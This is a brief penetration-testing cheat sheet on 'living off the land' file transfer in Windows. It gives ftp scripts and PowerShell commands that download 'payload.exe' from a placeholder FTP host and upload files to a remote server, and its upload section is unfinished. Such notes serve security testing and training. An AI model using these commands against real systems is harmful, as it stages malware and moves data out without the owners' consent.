# Living off the Land

## 01 - Download

### 1.1 - Command Prompt

You can include `ftp` commands to execute in a non-interactive way.

```
C:\> type transfer-file-ftp-GET.txt
open <ftp_server_IP> 21
USER <username>
<password>
binary
GET file.txt
bye

C:\> ftp -v -n -s:transfer-file-ftp-GET.txt
```

### 1.2 - PowerShell

#### 1.1.1 - `DownloadFile`

```powershell
PS C:\> $username = "<username>"
$password = "<password>"
$credential = New-Object System.Net.NetworkCredential($username, $password)
$webclient = New-Object System.Net.WebClient
$webclient.Credentials = $credential
$webclient.DownloadFile("ftp://<IP>/payload.exe", "payload.exe")
```

#### 1.1.2 - `Invoke-WebRequest`

```powershell
PS C:\> $username = "<username>"
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-WebRequest -UseBasicParse -Uri ftp://<IP>/payload.exe -OutFile payload.exe -Credential $credential
```

Can be simplified with `System.Net.NetworkCredential($username, $password)`.

```powershell
$username = "<username>"
$password = "<password>"
$credential = New-Object System.Net.NetworkCredential($username, $password)
Invoke-WebRequest -UseBasicParse -Uri ftp://<IP>/readme.txt -OutFile file.txt -Credential $credential
```

## 02 - Upload

### 2.1 - Command Prompt

```
C:\> transfer-file-ftp-PUT.txt
open <ftp_server_IP> 21
USER <username>
<password>
binary
PUT file.txt
bye

C:\> ftp -v -n -s:transfer-file-ftp-PUT.txt
```

### 2.2 - PowerShell

#### 2.2.1 - `UploadFile`

```
TODO: Fill in this info
```